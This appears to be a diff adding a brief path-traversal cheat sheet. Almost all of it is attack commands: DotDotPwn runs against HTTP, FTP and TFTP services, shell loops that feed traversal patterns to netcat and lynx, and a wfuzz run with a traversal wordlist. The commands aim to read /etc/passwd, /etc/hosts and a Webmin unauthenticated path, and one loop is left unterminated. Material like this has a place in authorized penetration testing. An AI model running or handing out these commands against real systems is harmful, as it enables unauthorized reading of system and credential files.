@@ -1,0 +1,25 @@
+Traversal
+
+
+
+
+
+
+Tools
+DotDotPwn
+HTTP
+./dotdotpwn.pl -m http -h 192.168.1.1 -x 8080 -f /etc/hosts -k "localhost" -d 8 -t 200 -s
+dotdotpwn.pl -m http -h 192.168.1.1 -M GET
+./dotdotpwn.pl -m http -h 192.168.1.1 -O -X -M POST -e .php -E
+./dotdotpwn.pl -m http-url -u http://192.168.1.1:10000/unauthenticated/TRAVERSAL -O -k "root:" -r webmin.txt
+FTP
+./dotdotpwn.pl -m ftp -h 192.168.1.1 -s -U nitr0us -P n1tr0u5pwnzj00 -o windows -q -r ftp_server.txt
+TFTP
+./dotdotpwn.pl -m tftp -h 192.168.1.1 -b -t 1 -f windows/system32/drivers/etc/hosts
+STDOUT
+./dotdotpwn.pl -m stdout -d 5
+for fuzz_pattern in $(./dotdotpwn.pl -m stdout -d 4 -f /etc/passwd); do file $fuzz_pattern; done
+for fuzz_pattern in $(./dotdotpwn.pl -m stdout -d 2 -f /etc/foobar | head -12); do lynx $fuzz_pattern;
+for fuzz_pattern in $(./dotdotpwn.pl -m stdout -d 5 -f /etc/passwd); do perl -e " print \"GET /unauthenticated/$fuzz_pattern HTTP/1.0\r\n\r\n\";" | nc localhost 10000; done
+WFUZZ
+wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/Traversal.txt -d "post=FUZZ" http://target.dom/endpoint
